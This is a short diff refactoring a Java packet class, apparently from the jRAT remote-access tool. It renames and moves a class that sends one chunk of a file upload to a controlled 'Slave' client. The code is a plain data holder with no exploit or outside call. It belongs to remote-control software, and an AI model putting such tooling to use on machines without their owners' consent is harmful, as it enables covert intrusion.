@@ -1,14 +1,15 @@
-package jrat.controller.packets.outgoing;
+package jrat.module.fs.packets.upload;
 
 import jrat.controller.Slave;
+import jrat.controller.packets.outgoing.OutgoingPacket;
 
-public class Packet104ServerUploadPart implements OutgoingPacket {
+public class Packet104Part implements OutgoingPacket {
 	
 	private String remoteFile;
 	private byte[] part;
 	private int to;
 	
-	public Packet104ServerUploadPart(String remoteFile, byte[] part, int to) {
+	public Packet104Part(String remoteFile, byte[] part, int to) {
 		this.remoteFile = remoteFile;
 		this.part = part;
 		this.to = to;
